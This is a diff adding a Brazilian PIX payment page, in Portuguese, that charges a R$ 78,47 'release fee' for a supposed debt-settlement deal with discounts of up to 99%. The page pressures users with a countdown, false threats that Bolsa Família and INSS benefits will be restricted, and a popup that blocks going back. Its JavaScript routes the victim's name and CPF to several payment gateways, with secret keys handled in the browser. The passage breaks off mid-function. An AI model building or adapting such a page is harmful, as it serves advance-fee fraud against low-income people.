@@ -1,0 +1,876 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<!-- Utmify -->
+
+<!-- Fim Utmify -->
+<!-- xTracky e TikTok removidos -->
+<script src="../js/utmify-utm.js" defer></script>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <title>Pagamento PIX</title>
+
+  <style>
+    :root {
+      --pink: #ec0978;
+      --pink-600: #d0086c;
+      --pink-50: #fff4fa;
+      --ink: #0f172a;
+      --sky: #f8fafc;
+      --footer: #1e2433;
+      --muted: #6b7280;
+      --radius: 16px;
+    }
+
+    *, ::before, ::after { box-sizing: border-box; margin: 0; padding: 0 }
+    html { height: 100% }
+    body {
+      min-height: 100%;
+      display: flex; flex-direction: column;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif;
+      color: #111827;
+      background: #f9fafb;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ===== Topbar ===== */
+    .topbar {
+      position: sticky; top: 0; z-index: 50;
+      background: var(--pink);
+      border-bottom: 1px solid rgba(0,0,0,.1);
+    }
+    .nav {
+      max-width: 900px; margin: 0 auto; padding: 12px 20px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .brand { display: flex; align-items: center; gap: 10px }
+    .brand img { height: 40px; width: auto; display: block; filter: brightness(0) invert(1) }
+    .avatar { display: flex; align-items: center; gap: 8px }
+    .badge {
+      height: 36px; width: 36px; display: grid; place-items: center;
+      border-radius: 999px; background: rgba(255,255,255,.2); color: white;
+      font-weight: 700; font-size: .85rem;
+    }
+    .user-info { text-align: right; line-height: 1.3 }
+    .user-name { color: #fff; font-weight: 600; font-size: .85rem; white-space: nowrap }
+    .user-cpf { color: rgba(255,255,255,.7); font-size: .75rem; letter-spacing: .03em }
+
+    /* ===== Hero ===== */
+    .hero {
+      flex: 1;
+      padding: 24px 16px 40px;
+      background:
+        radial-gradient(ellipse 900px 500px at 65% -5%, rgba(236,9,120,.07) 0, transparent 70%),
+        radial-gradient(ellipse 600px 400px at 15% 20%, rgba(236,9,120,.04) 0, transparent 70%),
+        #f9fafb;
+    }
+    .shell { max-width: 480px; margin: 0 auto; display: grid; gap: 16px }
+
+    /* ===== Card ===== */
+    .card {
+      background: #fff;
+      border: 1px solid rgba(0,0,0,.06);
+      border-radius: var(--radius);
+      box-shadow: 0 1px 3px rgba(0,0,0,.04), 0 8px 32px rgba(236,9,120,.06);
+      overflow: hidden;
+      transition: box-shadow .3s;
+    }
+    .card:hover {
+      box-shadow: 0 1px 3px rgba(0,0,0,.04), 0 12px 40px rgba(236,9,120,.1);
+    }
+    .card-head {
+      padding: 14px 20px;
+      display: flex; align-items: center; gap: 10px;
+      border-bottom: 1px solid rgba(0,0,0,.05);
+      background: linear-gradient(180deg, #fff 0%, #fffafd 100%);
+    }
+    .card-title { font-weight: 700; color: #111827; font-size: .95rem }
+    .card-body { padding: 20px }
+
+    /* Status dot */
+    .status-dot {
+      height: 10px; width: 10px; border-radius: 999px;
+      background: #22c55e; position: relative; flex-shrink: 0;
+    }
+    .status-dot::after {
+      content: ""; position: absolute; inset: -3px;
+      border-radius: 999px; background: #22c55e; opacity: .4;
+      animation: pulse 2s ease-in-out infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg) } }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); opacity: .4 }
+      50% { transform: scale(1.6); opacity: 0 }
+    }
+
+    /* ===== Timer ===== */
+    .timer-wrap {
+      display: flex; justify-content: center; gap: 12px; margin-bottom: 4px;
+    }
+    .timer-box {
+      background: #f3f4f6;
+      border: 1px solid rgba(0,0,0,.06);
+      border-radius: 12px;
+      padding: 14px 20px;
+      text-align: center;
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: var(--ink);
+      line-height: 1.2;
+      min-width: 80px;
+    }
+    .timer-box span {
+      display: block;
+      font-size: .75rem;
+      font-weight: 500;
+      color: var(--muted);
+      margin-top: 2px;
+    }
+
+    /* ===== Alerta ===== */
+    .alert-warning {
+      background: #fffbeb;
+      border: 1px solid #fbbf24;
+      border-left: 4px solid #f59e0b;
+      border-radius: 12px;
+      padding: 16px;
+      font-size: .875rem;
+      color: #92400e;
+      line-height: 1.6;
+    }
+    .alert-warning strong { display: block; margin-bottom: 6px; font-size: .95rem; color: #78350f }
+    .alert-warning ul { margin: 10px 0 0 18px; list-style: disc }
+    .alert-warning li { margin-bottom: 2px }
+
+    /* ===== QR & PIX ===== */
+    .valor-badge {
+      background: linear-gradient(135deg, var(--pink-50), #fff);
+      border: 1px solid rgba(236,9,120,.15);
+      border-radius: 12px;
+      padding: 10px 16px;
+      text-align: center;
+      font-weight: 700;
+      color: var(--pink);
+      font-size: 1rem;
+    }
+    .qr-wrap {
+      display: flex; justify-content: center; margin: 16px 0;
+    }
+    .qr-frame {
+      position: relative; width: 250px; height: 250px;
+      border-radius: 12px; overflow: hidden;
+      background: #f9fafb; border: 1px solid rgba(0,0,0,.06);
+    }
+    .qr-frame #spinner {
+      position: absolute; inset: 0;
+      display: flex; align-items: center; justify-content: center;
+      color: var(--muted); font-size: .85rem;
+    }
+    .qr-frame img { width: 100%; height: 100%; object-fit: contain }
+
+    .pix-input {
+      width: 100%;
+      padding: 10px 14px;
+      border: 1px solid #d1d5db;
+      border-radius: 10px;
+      font-size: .85rem;
+      color: #374151;
+      background: #f9fafb;
+      outline: none;
+      transition: border-color .2s;
+    }
+    .pix-input:focus { border-color: var(--pink) }
+
+    /* ===== Buttons ===== */
+    .btn {
+      display: block; width: 100%;
+      padding: 12px;
+      border: none; border-radius: 12px;
+      font-weight: 700; font-size: .95rem;
+      cursor: pointer;
+      transition: transform .15s, box-shadow .2s, background .2s;
+      text-align: center;
+    }
+    .btn:active { transform: scale(.98) }
+
+    .btn-pink {
+      background: var(--pink); color: #fff;
+      box-shadow: 0 4px 14px rgba(236,9,120,.3);
+    }
+    .btn-pink:hover { background: var(--pink-600); box-shadow: 0 6px 20px rgba(236,9,120,.35) }
+
+    .btn-green {
+      background: #22c55e; color: #fff;
+      box-shadow: 0 4px 14px rgba(34,197,94,.3);
+    }
+    .btn-green:hover { background: #16a34a; box-shadow: 0 6px 20px rgba(34,197,94,.35) }
+
+    .aguardando {
+      text-align: center; font-size: .85rem; color: var(--muted);
+      margin-top: 8px; font-weight: 500;
+    }
+
+    /* ===== Como pagar ===== */
+    .instrucoes h3 {
+      font-weight: 700; font-size: .95rem; color: #111827;
+      margin-bottom: 10px;
+    }
+    .instrucao-box {
+      background: #f9fafb;
+      border: 1px solid rgba(0,0,0,.06);
+      border-radius: 12px;
+      padding: 14px 16px;
+      margin-bottom: 10px;
+    }
+    .instrucao-box p.titulo { font-weight: 700; font-size: .875rem; margin-bottom: 6px; color: #111827 }
+    .instrucao-box ol { margin-left: 18px; list-style: decimal }
+    .instrucao-box li { font-size: .8rem; color: #4b5563; margin-bottom: 2px; line-height: 1.5 }
+
+    .instrucao-info {
+      background: linear-gradient(135deg, var(--pink-50), #fff0f7);
+      border: 1px solid rgba(236,9,120,.18);
+      border-left: 4px solid var(--pink);
+      border-radius: 12px;
+      padding: 16px 18px;
+      box-shadow: 0 4px 16px rgba(236,9,120,.08);
+    }
+    .instrucao-info p.titulo {
+      font-weight: 700; font-size: .95rem; margin-bottom: 6px; color: var(--pink);
+      display: flex; align-items: center; gap: 6px;
+    }
+    .instrucao-info p.titulo::before {
+      content: "\26A0"; font-size: 1.1rem;
+    }
+    .instrucao-info p.desc { font-size: .85rem; color: #374151; line-height: 1.6 }
+
+    /* ===== Popup Copia e Cola ===== */
+    .popup-overlay {
+      position: fixed; inset: 0; z-index: 100;
+      background: rgba(15,23,42,.5);
+      backdrop-filter: blur(4px);
+      display: none;
+      align-items: center; justify-content: center;
+      padding: 16px;
+    }
+    .popup-overlay.show { display: flex }
+    .popup-box {
+      background: #fff; border-radius: var(--radius);
+      box-shadow: 0 24px 64px rgba(0,0,0,.25);
+      width: 100%; max-width: 420px;
+      padding: 24px; position: relative;
+    }
+    .popup-header {
+      background: var(--pink); color: #fff;
+      text-align: center; padding: 12px;
+      border-radius: 10px; font-weight: 700;
+      margin-bottom: 20px; font-size: .95rem;
+    }
+    .popup-box h2 { font-size: 1.1rem; font-weight: 700; text-align: center; color: #111827; margin-bottom: 16px }
+    .popup-steps { margin-bottom: 20px }
+    .popup-step {
+      display: flex; align-items: center; gap: 12px; margin-bottom: 12px;
+    }
+    .popup-step-num {
+      width: 32px; height: 32px; border-radius: 999px;
+      background: var(--pink); color: #fff;
+      display: grid; place-items: center;
+      font-weight: 700; font-size: .85rem; flex-shrink: 0;
+    }
+    .popup-step span { color: #374151; font-size: .9rem }
+
+    /* ===== Notifications ===== */
+    .notif {
+      position: fixed; bottom: 20px; right: 20px;
+      padding: 12px 20px; border-radius: 12px;
+      color: #fff; font-weight: 600; font-size: .85rem;
+      box-shadow: 0 8px 24px rgba(0,0,0,.15);
+      display: none; z-index: 200;
+    }
+    .notif-green { background: #22c55e }
+    .notif-red { background: #ef4444 }
+    .notif-blue { background: #3b82f6 }
+    .notif.show { display: block }
+
+    /* ===== Responsive ===== */
+    @media (max-width: 520px) {
+      .hero { padding: 16px 10px 32px }
+      .card-body { padding: 16px }
+      .timer-box { padding: 10px 14px; font-size: 1.3rem; min-width: 68px }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ===== TOPBAR ===== -->
+  <header class="topbar">
+    <div class="nav">
+      <div class="brand">
+        <img src="images/logo.png" alt="Logo" onerror="this.style.display='none'">
+      </div>
+      <div class="avatar">
+        <div class="user-info">
+          <div class="user-name" id="user-display-name"></div>
+          <div class="user-cpf" id="user-display-cpf"></div>
+        </div>
+        <div class="badge" aria-label="Perfil" title="Perfil">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="8.5" r="3.2" fill="#ffffff"></circle>
+            <path d="M4.5 19.5c0-3.2 3.4-5.2 7.5-5.2s7.5 2 7.5 5.2v.3H4.5v-.3z" fill="#ffffff"></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- ===== MAIN ===== -->
+  <main class="hero">
+    <div class="shell">
+
+      <!-- Timer -->
+      <div class="card">
+        <div class="card-body">
+          <div class="timer-wrap">
+            <div class="timer-box" id="minutes">15<span>minutos</span></div>
+            <div class="timer-box" id="seconds">00<span>segundos</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Alerta -->
+      <div class="card">
+        <div class="card-body" style="padding:16px">
+          <div class="alert-warning">
+            <strong>ATENÇÃO!</strong>
+            Em caso de <b style="text-transform:uppercase">não pagamento</b> do acordo confirmado, a oferta com até 99% de desconto <b style="text-transform:uppercase">será cancelada</b> e só poderá voltar no próximo feirão.
+            <p style="margin-top:10px">Além disso, seu nome continuará com <b style="text-transform:uppercase">restrição</b>, o que pode bloquear benefícios importantes como:</p>
+            <ul>
+              <li>Restrição do Bolsa Família</li>
+              <li>Restrição no Cadastro INSS</li>
+              <li>Restrição de outros auxílios de 2025</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Pagamento PIX -->
+      <div class="card">
+        <div class="card-head">
+          <span class="status-dot"></span>
+          <div class="card-title">Pagamento da Taxa de Liberação</div>
+        </div>
+        <div class="card-body">
+          <div id="pix-info" style="display:none">
+            <p style="font-size:.85rem; color:#4b5563; text-align:center; margin-bottom:14px">
+              Copie o código Pix abaixo e realize o pagamento pelo aplicativo do seu banco.
+              Após a confirmação, todas as restrições vinculadas ao seu nome serão removidas em até 5 minutos.
+            </p>
+            <div class="valor-badge" id="valor-badge">Valor da Taxa: R$ 78,47</div>
+          </div>
+
+          <div class="qr-wrap">
+            <div class="qr-frame">
+              <div id="spinner" style="display:flex;flex-direction:column;align-items:center;gap:10px">
+                <svg width="36" height="36" viewBox="0 0 36 36" fill="none" style="animation:spin 1s linear infinite"><circle cx="18" cy="18" r="14" stroke="#e5e7eb" stroke-width="4"/><path d="M18 4a14 14 0 0 1 14 14" stroke="#ec0978" stroke-width="4" stroke-linecap="round"/></svg>
+                <span style="font-size:.8rem;color:#6b7280">Gerando pagamento...</span>
+              </div>
+              <img id="qrcode" alt="QR Code" style="display:none">
+            </div>
+          </div>
+
+          <div id="pix-actions" style="display:none">
+            <input type="text" id="pixcopiaecola" class="pix-input" readonly="">
+            <button id="copiar-pix" class="btn btn-pink" style="margin-top:10px">Copiar código de pagamento</button>
+            <p class="aguardando">Aguardando pagamento...</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Verificar Pagamento + Instruções -->
+      <div class="card" id="card-instrucoes" style="display:none">
+        <div class="card-body instrucoes">
+          <button id="verificar-pagamento" class="btn btn-green" style="margin-bottom:16px">Verificar Pagamento Manualmente</button>
+
+          <h3>Como pagar usando PIX</h3>
+
+          <div class="instrucao-box">
+            <p class="titulo">Opção 1: Código Copia e Cola</p>
+            <ol>
+              <li>Abra o aplicativo do seu banco</li>
+              <li>Procure a opção "PIX" ou "Pagar com PIX"</li>
+              <li>Selecione "Copiar e Colar" ou "PIX Copia e Cola"</li>
+              <li>Cole o código PIX que você copiou acima</li>
+              <li>Confira os dados e confirme o pagamento</li>
+            </ol>
+          </div>
+
+          <div class="instrucao-box">
+            <p class="titulo">Opção 2: Usando outro celular</p>
+            <ol>
+              <li>Abra o aplicativo do seu banco</li>
+              <li>Procure a opção "PIX" ou "Pagar com PIX"</li>
+              <li>Selecione "Ler QR Code" ou o ícone da câmera</li>
+              <li>Aponte a câmera do celular para o QR Code exibido acima</li>
+              <li>Confira os dados e confirme o pagamento</li>
+            </ol>
+          </div>
+
+          <div class="instrucao-info">
+            <p class="titulo">Importante:</p>
+            <p class="desc">Após realizar o pagamento, aguarde a confirmação. O sistema verificará automaticamente seu pagamento. Você também pode clicar em "Verificar Pagamento" para uma verificação manual.</p>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- .shell -->
+  </main>
+
+  <!-- ===== Popup Bloqueio de Retorno ===== -->
+  <div id="popupBloqueio" class="popup-overlay" style="z-index:9999">
+    <div class="popup-box">
+      <div class="popup-header" style="background:#ef4444">⚠️ Ação Bloqueada</div>
+      <h2 style="color:#111827;font-size:1rem;margin-bottom:12px">Você não pode retornar a esta etapa</h2>
+      <p style="font-size:.875rem;color:#4b5563;line-height:1.6;margin-bottom:16px">Seu pagamento da <strong>Taxa de Liberação (R$ 78,47)</strong> está sendo processado. Por favor, realize o pagamento para continuar.</p>
+      <button onclick="document.getElementById('popupBloqueio').classList.remove('show');" class="btn btn-pink">Entendi, vou pagar</button>
+    </div>
+  </div>
+
+  <!-- ===== Popup Copia e Cola ===== -->
+  <div id="popupcopiaecola" class="popup-overlay">
+    <div class="popup-box">
+      <div class="popup-header">Código PIX copiado com sucesso!</div>
+      <h2>Como realizar o pagamento via PIX</h2>
+      <div class="popup-steps">
+        <div class="popup-step">
+          <div class="popup-step-num">1</div>
+          <span>Abra o app ou site do seu banco</span>
+        </div>
+        <div class="popup-step">
+          <div class="popup-step-num">2</div>
+          <span>Selecione a opção Pix</span>
+        </div>
+        <div class="popup-step">
+          <div class="popup-step-num">3</div>
+          <span>Cole o código em Pagar via PIX</span>
+        </div>
+      </div>
+      <button onclick="document.getElementById('popupcopiaecola').classList.remove('show');" class="btn btn-pink">Entendi</button>
+    </div>
+  </div>
+
+  <!-- Notifications -->
+  <div id="notification" class="notif notif-green"></div>
+  <div id="notificacao-status-pagamento" class="notif notif-red"></div>
+
+  <!-- ===== SCRIPTS ===== -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script src="../config.js"></script>
+
+  <!-- User display -->
+  <script>
+    (function() {
+      const nome = localStorage.getItem('userName') || '';
+      const cpf = localStorage.getItem('userCPF') || '';
+      if (nome) {
+        const partes = nome.trim().split(/\s+/);
+        const exibir = partes.length > 1 ? partes[0] + ' ' + partes[partes.length - 1] : partes[0];
+        document.getElementById('user-display-name').textContent = exibir;
+      }
+      if (cpf) {
+        const limpo = cpf.replace(/\D/g, '');
+        const mascarado = limpo.slice(0,3) + '.\u2022\u2022\u2022.\u2022\u2022\u2022-' + limpo.slice(-2);
+        document.getElementById('user-display-cpf').textContent = mascarado;
+      }
+    })();
+  </script>
+
+  <!-- Copy PIX button -->
+  <script>
+    document.getElementById('copiar-pix').addEventListener('click', function () {
+      let inputPix = document.getElementById('pixcopiaecola');
+      if (!inputPix || !inputPix.value) { return; }
+      inputPix.select();
+      inputPix.setSelectionRange(0, 99999);
+      const popup = document.getElementById('popupcopiaecola');
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(inputPix.value)
+          .then(() => { popup?.classList.add('show'); })
+          .catch(err => {
+            try { document.execCommand('copy'); popup?.classList.add('show'); }
+            catch (error) { console.error('Error when copying (fallback):', error); }
+            finally { window.getSelection().removeAllRanges(); }
+          });
+      } else {
+        try { document.execCommand('copy'); popup?.classList.add('show'); }
+        catch (error) { console.error('Error when copying (fallback):', error); }
+        finally { window.getSelection().removeAllRanges(); }
+      }
+    });
+  </script>
+
+  <!-- ===== Main PIX Script ===== -->
+  <script>
+    // ===== HELPERS =====
+    function btoa_utf8(str) { return btoa(unescape(encodeURIComponent(str))); }
+
+    function extractTransactionId(data, gateway) {
+      if (gateway === 'ironpay') return data?.hash || data?.data?.hash || data?.id || data?.data?.id;
+      if (gateway === 'activepay') return data?.data?.id || data?.id || data?.data?.secureId;
+      if (gateway === 'unipay') return data?.data?.id || data?.id;
+      if (gateway === 'paguex') return data?.data?.id || data?.Id || data?.id;
+      if (gateway === 'moonfy') return data?.data?.id || data?.id;
+      if (gateway === 'mangofy') return data?.data?.payment_code || data?.data?.id || data?.payment_code || data?.id;
+      if (gateway === 'otimize') return data?.data?.id || data?.id;
+      if (gateway === 'sigilopay') return data?.transactionId || data?.id;
+      if (gateway === 'blackcat') return data?.data?.transactionId || data?.transactionId || data?.data?.id;
+      return null;
+    }
+
+    // ===== GATEWAYS: GERAR PIX =====
+    async function generatePixIronPay(creds, customerData, amountCents) {
+      if (!creds.offer_hash || !creds.product_hash) throw new Error('IronPay requer Offer Hash e Product Hash.');
+      const url = `${API_BASES.ironpay}/api/public/v1/transactions?api_token=${encodeURIComponent(creds.token)}`;
+      const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ amount: amountCents, offer_hash: creds.offer_hash, payment_method: 'pix', customer: { name: customerData.name, email: customerData.email, phone_number: customerData.phone, document: customerData.cpf, street_name: 'Rua Principal', number: '1', complement: '', neighborhood: 'Centro', city: 'São Paulo', state: 'SP', zip_code: '01001000' }, cart: [{ product_hash: creds.product_hash, title: 'Taxa de Liberação', cover: null, price: amountCents, quantity: 1, operation_type: 1, tangible: false }], expire_in_days: 1, transaction_origin: 'api' }) });
+      if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.message || `Erro IronPay: ${res.status}`); }
+      const data = await res.json();
+      return { pixCopyPaste: data?.pix?.pix_qr_code || data?.pix?.qrcode || data?.qrcode || null, qrCodeUrl: data?.pix?.pix_url || null, raw: data };
+    }
+
+    async function generatePixActivePay(creds, customerData, amountCents) {
+      const auth = 'Basic ' + btoa_utf8(creds.public_key + ':' + creds.secret_key);
+      const res = await fetch(`${API_BASES.activepay}/v1/transactions`, { method: 'POST', headers: { 'Authorization': auth, 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ amount: amountCents, paymentMethod: 'pix', customer: { name: customerData.name, email: customerData.email, phone: customerData.phone, document: { number: customerData.cpf, type: 'cpf' } }, items: [{ title: 'Taxa de Liberação', unitPrice: amountCents, quantity: 1, tangible: false, externalRef: 'checkout-pix' }], pix: { expiresInDays: 1 } }) });
+      if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.message || `Erro ActivePay: ${res.status}`); }
+      const data = await res.json();
+      const pix = data?.data?.pix?.qrcode || data?.pix?.qrcode || data?.qrcode || null;
+      return { pixCopyPaste: pix, qrCodeUrl: null, raw: data };
+    }
+
+    async function generatePixUniPay(creds, customerData, amountCents) {
+      const auth = 'Basic ' + btoa_utf8('x:' + creds.secret_key);
+      const res = await fetch(`${API_BASES.unipay}/api/user/transactions`, { method: 'POST', headers: { 'Authorization': auth, 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ amount: amountCents, paymentMethod: 'PIX', customer: { name: customerData.name, email: customerData.email, phone: customerData.phone.replace(/\D/g,''), document: { number: customerData.cpf.replace(/\D/g,''), type: 'CPF' } }, items: [{ title: 'Taxa de Liberação', unitPrice: amountCents, quantity: 1, tangible: false, externalRef: 'checkout-pix' }], pix: { expiresInDays: 1 }, traceable: true }) });
+      if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.message || `Erro UniPay: ${res.status}`); }
+      const data = await res.json();
+      const pix = data?.data?.pix?.qrcode || data?.pix?.qrcode || data?.qrcode || null;
+      return { pixCopyPaste: pix, qrCodeUrl: null, raw: data };
+    }
+
+    async function generatePixPagueX(creds, customerData, amountCents) {
+      const auth = 'Basic ' + btoa_utf8(creds.public_key + ':' + creds.secret_key);
+      const res = await fetch(`${API_BASES.paguex}/v1/payment-transaction/create`, { method: 'POST', headers: { 'Authorization': auth, 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ amount: amountCents, payment_method: 'pix', customer: { name: customerData.name, email: customerData.email, phone: customerData.phone, document: { number: customerData.cpf, type: 'cpf' } }, items: [{ title: 'Taxa de Liberação', unit_price: amountCents, quantity: 1, tangible: false, external_ref: 'checkout-pix' }], pix: { expires_in_days: 1 } }) });
+      if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.message || `Erro PagueX: ${res.status}`); }
+      const data = await res.json();
+      return { pixCopyPaste: data?.data?.pix?.qr_code || data?.pix?.qr_code || null, qrCodeUrl: data?.data?.pix?.url || null, raw: data };
+    }
+
+    async function generatePixMoonfy(creds, customerData, amountCents) {
+      const auth = 'Basic ' + btoa_utf8(creds.public_key + ':' + creds.secret_key);
+      const res = await fetch(`${API_BASES.moonfy}/v1/transactions`, { method: 'POST', headers: { 'Authorization': auth, 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ amount: amountCents, paymentMethod: 'pix', customer: { name: customerData.name, email: customerData.email, phone: customerData.phone, document: { number: customerData.cpf, type: 'cpf' } }, items: [{ title: 'Taxa de Liberação', unitPrice: amountCents, quantity: 1, tangible: false, externalRef: 'checkout-pix' }], pix: { expiresInDays: 1 } }) });
+      if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.message || `Erro Moonfy: ${res.status}`); }
+      const data = await res.json();
+      const pix = data?.data?.pix?.qrcode || data?.pix?.qrcode || data?.qrcode || null;
+      return { pixCopyPaste: pix, qrCodeUrl: null, raw: data };
+    }
+
+    async function generatePixMangofy(creds, customerData, amountCents) {
+      let clientIp = '0.0.0.0';
+      try { const r = await fetch('https://api.ipify.org?format=json'); clientIp = (await r.json()).ip || '0.0.0.0'; } catch(e) {}
+      const postbackUrl = creds.postback_url || (location.origin && location.origin.startsWith('http') ? location.origin + '/postback' : 'https://checkout.mangofy.com.br/postback');
+      const res = await fetch(`${API_BASES.mangofy}/api/v1/payment`, { method: 'POST', headers: { 'Authorization': creds.api_key, 'Store-Code': creds.store_code, 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ store_code: creds.store_code, payment_method: 'pix', payment_format: 'regular', installments: 1, payment_amount: amountCents, postback_url: postbackUrl, items: [{ title: 'Taxa de Liberação', unit_price: amountCents, quantity: 1, tangible: false, external_ref: 'checkout-pix' }], customer: { name: customerData.name, email: customerData.email, phone: customerData.phone, document: customerData.cpf, ip: clientIp }, pix: { expires_in_days: 1 }, external_code: 'checkout-' + Date.now() }) });
+      if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.message || `Erro Mangofy: ${res.status}`); }
+      const raw = await res.json();
+      const data = raw.data || raw;
+      const pix = data?.pix?.pix_qrcode_text || data?.pix?.qrcode_text || data?.pix_qrcode || data?.pix?.qrcode || data?.pix?.qr_code || data?.qr_code || null;
+      return { pixCopyPaste: pix, qrCodeUrl: data?.pix_qr_url || null, raw };
+    }
+
+    async function generatePixOtimize(creds, customerData, amountCents) {
+      const auth = 'Basic ' + btoa_utf8(creds.secret_key + ':x');
+      const res = await fetch(`${API_BASES.otimize}/v1/transactions`, { method: 'POST', headers: { 'Authorization': auth, 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ amount: amountCents, paymentMethod: 'pix', customer: { name: customerData.name, email: customerData.email, phone: customerData.phone, document: { number: customerData.cpf, type: 'cpf' } }, items: [{ title: 'Taxa de Liberação', unitPrice: amountCents, quantity: 1, tangible: false, externalRef: 'checkout-pix' }], pix: { expiresInDays: 1 } }) });
+      if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.message || `Erro Otimize: ${res.status}`); }
+      const data = await res.json();
+      const pix = data?.data?.pix?.qrcode || data?.pix?.qrcode || data?.data?.pix?.qr_code || data?.qrcode || null;
+      return { pixCopyPaste: pix, qrCodeUrl: null, raw: data };
+    }
+
+    async function generatePixSigiloPay(creds, customerData, amountCents) {
+      const res = await fetch(`${API_BASES.sigilopay}/gateway/pix/receive`, { method: 'POST', headers: { 'x-public-key': creds.public_key, 'x-secret-key': creds.secret_key, 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ identifier: 'checkout-' + Date.now(), amount: amountCents / 100, client: { name: customerData.name, email: customerData.email, phone: customerData.phone, document: customerData.cpf }, products: [{ id: 'prod-1', name: 'Taxa de Liberação', quantity: 1, price: amountCents / 100 }], callbackUrl: window.location.origin + '/api/webhook/sigilopay' }) });
+      if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.message || `Erro SigiloPay: ${res.status}`); }
+      const data = await res.json();
+      return { pixCopyPaste: data?.pix?.code || null, qrCodeUrl: data?.pix?.image || null, raw: data };
+    }
+
+    async function generatePixBlackCat(creds, customerData, amountCents) {
+      const res = await fetch(`${API_BASES.blackcat}/sales/create-sale`, { method: 'POST', headers: { 'X-API-Key': creds.api_key, 'Content-Type': 'application/json', 'Accept': 'application/json' }, body: JSON.stringify({ amount: amountCents, currency: 'BRL', paymentMethod: 'pix', items: [{ title: 'Taxa de Liberação', unitPrice: amountCents, quantity: 1, tangible: false }], customer: { name: customerData.name, email: customerData.email, phone: customerData.phone.replace(/\D/g,''), document: { number: customerData.cpf.replace(/\D/g,''), type: 'cpf' } }, pix: { expiresInDays: 1 }, externalRef: 'checkout-' + Date.now() }) });
+      if (!res.ok) { const e = await res.json().catch(() => ({})); throw new Error(e.message || e.error || `Erro BlackCat: ${res.status}`); }
+      const data = await res.json();
+      const pd = data?.data?.paymentData || data?.paymentData || {};
+      const pix = pd.copyPaste || pd.qrCode || null;
+      return { pixCopyPaste: pix, qrCodeUrl: null, raw: data };
+    }
+
+    async function gerarPixGateway(customerData, amountCents) {
+      const config = typeof GLOBAL_CONFIG !== 'undefined' ? GLOBAL_CONFIG : null;
+      if (!config || !config.activeGateway) throw new Error('Nenhum gateway configurado.');
+      const gw = config.activeGateway;
+      const creds = config.gateways[gw];
+      if (!creds) throw new Error('Credenciais não encontradas para ' + gw);
+      switch (gw) {
+        case 'ironpay':   return { ...(await generatePixIronPay(creds, customerData, amountCents)),   gateway: gw };
+        case 'activepay': return { ...(await generatePixActivePay(creds, customerData, amountCents)), gateway: gw };
+        case 'unipay':    return { ...(await generatePixUniPay(creds, customerData, amountCents)),    gateway: gw };
+        case 'paguex':    return { ...(await generatePixPagueX(creds, customerData, amountCents)),    gateway: gw };
+        case 'moonfy':    return { ...(await generatePixMoonfy(creds, customerData, amountCents)),    gateway: gw };
+        case 'mangofy':   return { ...(await generatePixMangofy(creds, customerData, amountCents)),   gateway: gw };
+        case 'otimize':   return { ...(await generatePixOtimize(creds, customerData, amountCents)),   gateway: gw };
+        case 'sigilopay': return { ...(await generatePixSigiloPay(creds, customerData, amountCents)), gateway: gw };
+        case 'blackcat':  return { ...(await generatePixBlackCat(creds, customerData, amountCents)),  gateway: gw };
+        default: throw new Error('Gateway desconhecido: ' + gw);
+      }
+    }
+
+    // ===== POLLING STATUS =====
+    async function checkPaymentStatus(txId, gateway) {
+      const config = typeof GLOBAL_CONFIG !== 'undefined' ? GLOBAL_CONFIG : null;
+      if (!config) return false;
+      const creds = config.gateways[gateway];
+      let res;
+      try {
+        switch (gateway) {
+          case 'ironpay': res = await fetch(`${API_BASES.ironpay}/api/public/v1/transactions?api_token=${encodeURIComponent(creds.token)}&hash=${txId}`, { headers: { 'Accept': 'application/json' } }); break;
+          case 'activepay': { const a = 'Basic ' + btoa_utf8(creds.public_key + ':' + creds.secret_key); res = await fetch(`${API_BASES.activepay}/v1/transactions/${txId}`, { headers: { 'Authorization': a, 'Accept': 'application/json' } }); break; }
+          case 'unipay': { const a = 'Basic ' + btoa_utf8('x:' + creds.secret_key); res = await fetch(`${API_BASES.unipay}/api/user/transactions/${txId}`, { headers: { 'Authorization': a, 'Accept': 'application/json' } }); break; }
+          case 'paguex': { const a = 'Basic ' + btoa_utf8(creds.public_key + ':' + creds.secret_key); res = await fetch(`${API_BASES.paguex}/v1/payment-transaction/info/${txId}`, { headers: { 'Authorization': a, 'Accept': 'application/json' } }); break; }
+          case 'moonfy': { const a = 'Basic ' + btoa_utf8(creds.public_key + ':' + creds.secret_key); res = await fetch(`${API_BASES.moonfy}/v1/transactions/${txId}`, { headers: { 'Authorization': a, 'Accept': 'application/json' } }); break; }
